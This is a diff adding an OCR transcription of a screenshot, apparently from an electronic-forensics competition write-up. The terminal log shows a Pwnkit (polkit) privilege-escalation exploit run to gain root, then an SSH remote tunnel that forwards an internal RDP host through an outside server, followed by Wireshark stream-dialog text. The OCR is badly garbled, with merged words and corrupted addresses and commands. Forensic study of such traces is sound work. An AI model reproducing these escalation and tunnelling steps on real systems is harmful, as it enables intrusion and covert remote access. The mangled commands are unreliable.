@@ -1,0 +1,36 @@
+# OCR: 8488f0c79ebf9b0548cdbc0d8ace0670.jpg
+# 来源: ./02-WriteUp/2024/2024-电子取证比武-复盘/8488f0c79ebf9b0548cdbc0d8ace0670.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:15
+
+[www@localhost Pwnkit-Exploit-main]s
+/exp
+/exploit
+Current User before execute exploit hacker@victimswhoami:ww
+Exploit written by @luijait(ex6c75696a616974)mkdir:cannot createdirectory...GconV_PATH=....:File exists mkdir: cannot create directory ...tmp..: File exists
+[+] Enjoy your root if exploit was completed succesfully bash:no job control in this shell
+[root@localhostPwnkit-Exploit-main]#1s 1s
+b64payloadgen.sh
+exploit exploit.c GCONV.PATH=.
+LICENSE Makefile
+pwnkit64decoded.c
+README.md tmp
+[root@localhost Pwnkit-Exploit-main]#cd..] cd.../
+[root@localhostapplication]#ssh-CgfnRe.0.0.o:22222192.168.10o.254:3389root@222.2.2.2-p33333
+ssh-CgfNRe.e.e.e:22222:192.168.100.254:3389r
+<j#5sh-CgfNRe.e.8.0:22222:192.168.100.254:3389ro
++***.**+*****+*****..0t@222.2.2.2-p33333
+Warning:Permanently added[222.2.2.2]:33333(ECDSA)to thelist of known hosts.[root@localhostapplication]#
+分组273,69客户师分组，10股务器分组，20turm(s点击进带
+整个对话（1900bytes）查找
+Showdataas
+ASCI
+涨掉此流
+打印
+男存为…
+返回
+关闭
+流4
+A
+查找下一个N
+帮助
